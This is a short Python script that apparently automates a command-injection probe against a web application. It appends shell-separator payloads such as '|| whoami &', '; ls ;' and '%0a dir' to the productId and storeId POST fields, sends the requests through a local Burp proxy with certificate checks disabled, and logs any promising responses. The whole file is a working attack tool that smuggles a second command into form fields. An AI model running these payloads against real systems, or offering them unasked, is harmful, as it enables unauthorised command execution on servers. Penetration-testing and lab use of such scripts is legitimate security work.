# Basic command injection with a few potentially interesting commands
# Writes potentially interesting results to text file for later review
# Suppress results to console or file as desired
import requests
import urllib3
import sys

# Suppress insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy to use Burp
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def cmd_inj(url):
    f = open('./cmd_inj_results_simple.txt', 'w+')
    cmd_tests = [
        '|| whoami &',
        '| whoami |',
        '& whoami',
        '& whoami &',
        '; whoami ;',
        '%0a whoami',
        "' whoami",
        '|| ls &',
        '| ls |',
        '& ls',
        '& ls &',
        '; ls ;',
        '%0a ls',
        "' ls",
        '|| dir &',
        '| dir |',
        '& dir',
        '& dir &',
        '; dir ;',
        '%0a dir',
        "' dir",
    ]
    
    for cmd in cmd_tests:
        data1 = {
           'productId':'1'+cmd,
            'storeId':'1'
        }
        r_1 = requests.post(url=url, proxies=proxies, verify=False, data=data1)
        if r_1.status_code == 200 and 'not found' not in r_1.text and len(r_1.text) > 3:
            print('[+] Interesting response for productId')
            print(f"Command {cmd}")
            print(f"Returned {r_1.text}")
            f.write(f"----------- \n productId: {cmd} \n {r_1.text}")
        data2 = {
           'productId':'1',
            'storeId':'1'+cmd
        }
        r_2 = requests.post(url=url, proxies=proxies, verify=False, data=data2)
        if r_2.status_code == 200 and 'not found' not in r_2.text and len(r_2.text) > 3:
            print('[+] Interesting response for storeId')
            print(f"Command {cmd}")
            print(f"Returned {r_2.text}")
            f.write(f"----------- \n storeId: {cmd} \n {r_2.text}")
    f.close()


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        #data = sys.argv[2].strip()
    
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f"[-] Example: {sys.argv[0]} www.example.com/image?filename= ")
        sys.exit(-1)
    
    print('[-] Attempting simple command injection')
    exploit = cmd_inj(url)
    #print(exploit)